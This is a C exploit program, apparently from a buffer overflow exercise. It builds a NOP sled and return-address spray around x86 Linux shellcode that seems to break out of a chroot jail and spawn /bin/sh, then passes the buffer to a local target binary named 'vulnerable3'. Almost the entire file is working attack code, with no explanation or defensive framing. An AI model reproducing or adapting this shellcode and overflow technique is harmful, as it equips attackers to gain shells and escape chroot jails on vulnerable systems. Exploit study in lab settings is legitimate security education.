#include <stdlib.h>

#define ALIGN                             0
#define OFFSET                            0
#define RET_POSITION                   1024
#define RANGE                            20
#define NOP                            0x90

char shellcode[]=
	"\xeb\x57"                      /* jmp 0x4f              */
	"\x31\xc0"                      /* xorl %eax,%eax        */
	"\x31\xc9"                      /* xorl %ecx,%ecx        */
	"\x5e"                          /* popl %esi             */
	"\x88\x46\x07"                  /* movb %al,0x7(%esi)    */
	"\xb0\x27"                      /* movb $0x27,%al        */
	"\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
	"\xfe\xc5"                      /* incb %ch              */
	"\xb1\xed"                      /* movb $0xed,%cl        */
	"\xcd\x80"                      /* int $0x80             */
	"\x31\xc0"                      /* xorl %eax,%eax        */
	"\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
	"\xb0\x3d"                      /* movb $0x3d,%al        */
	"\xcd\x80"                      /* int $0x80             */
	"\x31\xc0"                      /* xorl %eax,%eax        */
	"\xbb\xd2\xd1\xd0\xff"          /* movl $0xffd0d1d2,%ebx */
	"\xf7\xdb"                      /* negl %ebx             */
	"\x31\xc9"                      /* xorl %ecx,%ecx        */
	"\xb1\x01"                      /* movb $0x01,%cl        */      // <--------
	"\x56"                          /* pushl %esi            */      //          |
	"\x89\x5e\x08"                  /* movl %ebx,0x8(%esi)   */      //          |
	"\x83\xc6\x03"                  /* addl %0x3,%esi        */              
        "\xe0\xf8"                 	/* loopne -0x7           */
	"\x5e"                          /* popl %esi             */
	"\xb0\x3d"                      /* movb $0x3d,%al        */
	"\x8d\x5e\x08"                  /* leal 0x10(%esi),%ebx  */
	"\xcd\x80"                      /* int $0x80             */
	"\x31\xc0"                      /* xorl %eax,%eax        */
	"\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
	"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
	"\xb0\x0b"                      /* movb $0xb,%al         */
	"\x89\xf3"                      /* movl %esi,%ebx        */
	"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
	"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
	"\xcd\x80"                      /* int $0x80             */      //          |
	                                                                 //          |
	"\x8d\x46\xcc"                  /* leal 0xffffffcc(%esi),%eax */ //  --------
	"\x8a\x18"                      /* movb (%eax),%bl       */
	"\xfe\xc3"                      /* incb %bl              */
	"\x88\x18"                      /* movb %bl,(%eax)       */
	
	"\xe8\xa4\xff\xff\xff"          /* call -0x54            */
	"/bin/sh";                      /* .string \"/bin/sh\"   */

unsigned long get_sp(void)
{
  __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
  char buff[RET_POSITION+RANGE+ALIGN+1],*ptr;
  long addr;
  unsigned long sp;
  int offset=OFFSET,bsize=RET_POSITION+RANGE+ALIGN+1;
  int i;

  if(argc > 1)
    offset=atoi(argv[1]);

  sp=get_sp();
  addr=sp-offset;

  for(i=0;i<bsize;i+=4)
  {
    buff[i+ALIGN]=(addr&0x000000ff);
    buff[i+ALIGN+1]=(addr&0x0000ff00)>>8;
    buff[i+ALIGN+2]=(addr&0x00ff0000)>>16;
    buff[i+ALIGN+3]=(addr&0xff000000)>>24;
  }

  for(i=0;i<bsize-RANGE*2-strlen(shellcode)-1;i++)
    buff[i]=NOP;

  ptr=buff+bsize-RANGE*2-strlen(shellcode)-1;

  for(i=0;i<strlen(shellcode);i++)
    *(ptr++)=shellcode[i];

  buff[bsize-1]='\0';

  printf("Jump to 0x%08x\n",addr);
  execl("./vulnerable3","vulnerable3",buff,0);
}
